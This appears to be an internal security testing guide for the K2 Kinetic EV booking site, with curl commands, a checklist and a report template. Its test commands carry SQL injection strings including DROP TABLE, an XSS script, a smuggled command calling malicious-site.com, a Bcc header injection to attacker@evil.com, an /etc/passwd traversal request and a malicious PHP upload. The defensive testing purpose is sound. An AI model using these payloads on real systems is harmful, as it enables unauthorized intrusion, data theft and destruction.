# K2 Application Security Testing Guide

**Project**: K2 - Kinetic EV Website  
**Created**: September 14, 2025  
**Purpose**: Comprehensive security testing methodology for all application flows

---

## 🎯 **Testing Overview**

This guide provides systematic security testing for your K2 booking system covering:
- Direct access protection verification
- Authentication & authorization testing
- Input validation & injection testing
- API security assessment
- Configuration security audit
- Session management testing
- File upload security
- Error handling & information disclosure

---

## 🛡️ **1. DIRECT ACCESS PROTECTION TESTING**

### **Test Scope**: Verify 35 protected PHP files return 404 on direct access

#### **Test Commands**
```powershell
# Test CRITICAL files (Configuration)
curl -I "https://test.kineticev.in/php/config.php"
curl -I "https://test.kineticev.in/php/prod-config.php"
curl -I "https://test.kineticev.in/php/test-config.php"
curl -I "https://test.kineticev.in/php/dev-config.php"

# Test HIGH PRIORITY files (Core Classes)
curl -I "https://test.kineticev.in/php/DatabaseHandler.php"
curl -I "https://test.kineticev.in/php/SalesforceService.php"
curl -I "https://test.kineticev.in/php/EmailHandler.php"
curl -I "https://test.kineticev.in/php/SmsService.php"
curl -I "https://test.kineticev.in/php/Logger.php"
curl -I "https://test.kineticev.in/php/DataValidator.php"
curl -I "https://test.kineticev.in/php/JWTHandler.php"
curl -I "https://test.kineticev.in/php/DatabaseUtils.php"
curl -I "https://test.kineticev.in/php/DatabaseMigration.php"
curl -I "https://test.kineticev.in/php/EmailNotificationsMigration.php"
curl -I "https://test.kineticev.in/php/production-timezone-guard.php"

# Test MEDIUM PRIORITY files (Admin)
curl -I "https://test.kineticev.in/php/admin/AdminHandler.php"

# Test LOWER PRIORITY files (Components)
curl -I "https://test.kineticev.in/php/components/header.php"
curl -I "https://test.kineticev.in/php/components/footer.php"
curl -I "https://test.kineticev.in/php/components/head.php"
curl -I "https://test.kineticev.in/php/components/scripts.php"
curl -I "https://test.kineticev.in/php/components/layout.php"
curl -I "https://test.kineticev.in/php/components/modals.php"
curl -I "https://test.kineticev.in/php/components/admin-header.php"
curl -I "https://test.kineticev.in/php/components/admin-footer.php"
curl -I "https://test.kineticev.in/php/components/google-maps-script.php"
curl -I "https://test.kineticev.in/php/components/migrate.php"

# Test Email Templates
curl -I "https://test.kineticev.in/php/email-templates/contact-admin-email.tpl.php"
curl -I "https://test.kineticev.in/php/email-templates/contact-customer-email.tpl.php"
curl -I "https://test.kineticev.in/php/email-templates/test-ride-admin-email.tpl.php"
curl -I "https://test.kineticev.in/php/email-templates/test-ride-customer-email.tpl.php"
curl -I "https://test.kineticev.in/php/email-templates/transaction-failure-admin.tpl.php"
curl -I "https://test.kineticev.in/php/email-templates/transaction-failure-customer.tpl.php"
curl -I "https://test.kineticev.in/php/email-templates/transaction-success-admin.tpl.php"
curl -I "https://test.kineticev.in/php/email-templates/transaction-success-customer.tpl.php"
```

#### **Expected Results**
- All commands should return: `HTTP/1.1 404 Not Found`
- No PHP errors or configuration details should be exposed
- Response body should be empty or standard 404 page

#### **Functionality Test**
Test that protected files still work when included:
- Visit main pages: `/`, `/contact-us.php`, `/book-now.php`
- Test form submissions
- Verify includes work properly

---

## 🔐 **2. AUTHENTICATION & AUTHORIZATION TESTING**

### **Admin Access Testing**
```powershell
# Test admin login page
curl -I "https://test.kineticev.in/php/admin/"

# Test direct admin access without authentication
curl -I "https://test.kineticev.in/php/admin/dashboard.php"
curl -I "https://test.kineticev.in/php/admin/analytics.php"
```

### **JWT Token Testing**
```powershell
# Test JWT token validation
curl -X POST "https://test.kineticev.in/api/test-jwt" -H "Authorization: Bearer invalid_token"
curl -X POST "https://test.kineticev.in/api/test-jwt" -H "Authorization: Bearer expired_token"
```

### **Session Management Testing**
- Test session timeout
- Test concurrent sessions
- Test session fixation attacks
- Test secure cookie settings

---

## 🔍 **3. INPUT VALIDATION & SQL INJECTION TESTING**

### **Contact Form Testing**
```powershell
# SQL Injection attempts
curl -X POST "https://test.kineticev.in/api/submit-contact" \
  -d "full_name=' OR 1=1--" \
  -d "email=test@test.com" \
  -d "phone=1234567890" \
  -d "help_type=General" \
  -d "message=test"

# XSS attempts
curl -X POST "https://test.kineticev.in/api/submit-contact" \
  -d "full_name=<script>alert('xss')</script>" \
  -d "email=test@test.com" \
  -d "phone=1234567890" \
  -d "help_type=General" \
  -d "message=test"
```

### **Test Ride Form Testing**
```powershell
# SQL Injection in test ride form
curl -X POST "https://test.kineticev.in/api/submit-test-ride" \
  -d "full_name=' UNION SELECT password FROM users--" \
  -d "email=test@test.com" \
  -d "phone=1234567890" \
  -d "date=2025-09-15" \
  -d "pincode=110001"

# Invalid data types
curl -X POST "https://test.kineticev.in/api/submit-test-ride" \
  -d "full_name=John Doe" \
  -d "email=not_an_email" \
  -d "phone=abc123" \
  -d "date=invalid_date" \
  -d "pincode=invalid_pincode"
```

### **Payment Form Testing**
```powershell
# Test payment injection
curl -X POST "https://test.kineticev.in/api/payment/initiate" \
  -d "amount='; DROP TABLE payments;--" \
  -d "customer_id=1" \
  -d "vehicle_variant=range-x"
```

---

## 🌐 **4. API SECURITY TESTING**

### **Salesforce Integration Testing**
```powershell
# Test Salesforce endpoint without proper authentication
curl -X POST "https://test.kineticev.in/api/salesforce/submit" \
  -d "data=test"

# Test with malformed Salesforce data
curl -X POST "https://test.kineticev.in/api/submit-contact" \
  -d "full_name=$(curl -X POST https://malicious-site.com)" \
  -d "email=test@test.com"
```

### **Email/SMS Service Testing**
```powershell
# Test email injection
curl -X POST "https://test.kineticev.in/api/submit-contact" \
  -d "email=test@test.com%0D%0ABcc:attacker@evil.com"

# Test SMS injection
curl -X POST "https://test.kineticev.in/api/submit-test-ride" \
  -d "phone=1234567890%0D%0ATo:+919999999999"
```

### **Rate Limiting Testing**
```powershell
# Test API rate limits
for i in {1..100}; do
  curl -X POST "https://test.kineticev.in/api/submit-contact" \
    -d "full_name=Test$i" \
    -d "email=test$i@test.com" &
done
```

---

## ⚙️ **5. CONFIGURATION SECURITY AUDIT**

### **Environment Detection Testing**
```powershell
# Test environment detection bypass attempts
curl "https://test.kineticev.in/?debug=true"
curl "https://test.kineticev.in/?env=production"
curl "https://test.kineticev.in/php/config.php?show_config=1"
```

### **Database Connection Testing**
```powershell
# Test database error exposure
curl "https://test.kineticev.in/api/test-db-connection"
curl "https://test.kineticev.in/check-database-health.php"
```

### **API Key Exposure Testing**
```powershell
# Check for exposed API keys in responses
curl -v "https://test.kineticev.in/" | grep -i "key\|token\|secret"
curl -v "https://test.kineticev.in/book-now.php" | grep -i "salesforce\|razorpay"
```

---

## 🍪 **6. SESSION & CSRF PROTECTION TESTING**

### **CSRF Testing**
```powershell
# Test CSRF protection on forms
curl -X POST "https://test.kineticev.in/api/submit-contact" \
  -H "Referer: https://malicious-site.com" \
  -d "full_name=CSRF Test" \
  -d "email=csrf@test.com"

# Test without CSRF token
curl -X POST "https://test.kineticev.in/api/submit-test-ride" \
  -d "full_name=John Doe" \
  -d "email=john@test.com" \
  -d "phone=1234567890"
```

### **Session Security Testing**
```powershell
# Test session cookie security
curl -I "https://test.kineticev.in/" | grep -i "set-cookie"

# Test session fixation
curl -b "PHPSESSID=attacker_session_id" "https://test.kineticev.in/php/admin/"
```

---

## 📁 **7. FILE UPLOAD & DIRECTORY SECURITY**

### **Directory Traversal Testing**
```powershell
# Test directory traversal
curl "https://test.kineticev.in/../../../etc/passwd"
curl "https://test.kineticev.in/php/../config.php"
curl "https://test.kineticev.in/logs/../php/config.php"
```

### **Sensitive File Access Testing**
```powershell
# Test access to sensitive files
curl -I "https://test.kineticev.in/.htaccess"
curl -I "https://test.kineticev.in/composer.json"
curl -I "https://test.kineticev.in/composer.lock"
curl -I "https://test.kineticev.in/.env"
curl -I "https://test.kineticev.in/logs/"
```

### **File Upload Security Testing**
If your application has file upload functionality:
```powershell
# Test malicious file upload (if applicable)
curl -X POST "https://test.kineticev.in/api/upload" \
  -F "file=@malicious.php" \
  -F "type=image"
```

---

## 🚨 **8. ERROR HANDLING & INFORMATION DISCLOSURE**

### **Error Page Testing**
```powershell
# Test error page information disclosure
curl "https://test.kineticev.in/nonexistent-page.php"
curl "https://test.kineticev.in/php/nonexistent-file.php"
curl "https://test.kineticev.in/api/nonexistent-endpoint"
```

### **Debug Information Testing**
```powershell
# Test for debug information exposure
curl "https://test.kineticev.in/?debug=1"
curl "https://test.kineticev.in/?XDEBUG_SESSION_START=1"
curl "https://test.kineticev.in/phpinfo.php"
```

### **Stack Trace Testing**
```powershell
# Test for stack trace exposure
curl -X POST "https://test.kineticev.in/api/submit-contact" \
  -d "malformed_json={invalid"
```

---

## 📊 **AUTOMATED SECURITY TESTING TOOLS**

### **OWASP ZAP Testing**
```powershell
# Install and run OWASP ZAP
# Download from: https://www.zaproxy.org/download/
zap.sh -cmd -quickurl https://test.kineticev.in
```

### **Nikto Web Scanner**
```powershell
# Install Nikto
# Run comprehensive scan
nikto -h https://test.kineticev.in
```

### **SQLMap for SQL Injection Testing**
```powershell
# Install SQLMap
# Test contact form for SQL injection
sqlmap -u "https://test.kineticev.in/api/submit-contact" \
  --data "full_name=test&email=test@test.com&phone=1234567890&help_type=General&message=test" \
  --batch
```

---

## 🎯 **SECURITY TESTING CHECKLIST**

### **Pre-Testing Setup**
- [ ] Backup current database
- [ ] Set up test environment
- [ ] Enable detailed logging
- [ ] Prepare test data

### **Direct Access Protection**
- [ ] Test all 35 protected PHP files return 404
- [ ] Verify functionality still works via includes
- [ ] Check no sensitive information in 404 responses

### **Authentication & Authorization**
- [ ] Test admin access controls
- [ ] Verify JWT token validation
- [ ] Test session management
- [ ] Check role-based permissions

### **Input Validation**
- [ ] Test all form inputs for SQL injection
- [ ] Test XSS vulnerabilities
- [ ] Verify data type validation
- [ ] Test boundary conditions

### **API Security**
- [ ] Test Salesforce integration security
- [ ] Verify email/SMS injection protection
- [ ] Test rate limiting
- [ ] Check API authentication

### **Configuration Security**
- [ ] Verify environment detection works
- [ ] Test database connection security
- [ ] Check for exposed API keys
- [ ] Validate production settings

### **Session & CSRF**
- [ ] Test CSRF protection
- [ ] Verify session security
- [ ] Check cookie settings
- [ ] Test session fixation protection

### **File & Directory Security**
- [ ] Test directory traversal protection
- [ ] Verify .htaccess protection
- [ ] Check sensitive file access
- [ ] Test file upload security (if applicable)

### **Error Handling**
- [ ] Test error page information disclosure
- [ ] Verify no debug information exposure
- [ ] Check stack trace handling
- [ ] Test 404 error consistency

---

## 📋 **SECURITY TESTING REPORT TEMPLATE**

```markdown
# K2 Security Testing Report

**Date**: [Date]
**Tester**: [Name]
**Environment**: [test.kineticev.in/production]

## Executive Summary
- Overall Security Score: [X/10]
- Critical Issues Found: [Number]
- High Priority Issues: [Number]
- Recommendations: [Summary]

## Test Results

### Direct Access Protection: [PASS/FAIL]
- Files tested: 35/35
- Protection working: [Number]
- Issues found: [Details]

### Authentication & Authorization: [PASS/FAIL]
- [Detailed results]

### Input Validation: [PASS/FAIL]
- [Detailed results]

[Continue for each section...]

## Critical Issues Found
1. [Issue description, impact, recommendation]
2. [Issue description, impact, recommendation]

## Recommendations
1. [Priority 1 recommendations]
2. [Priority 2 recommendations]
```

---

**Last Updated**: September 14, 2025  
**Next Review**: After security fixes implementation  
**Classification**: Internal Security Testing Guide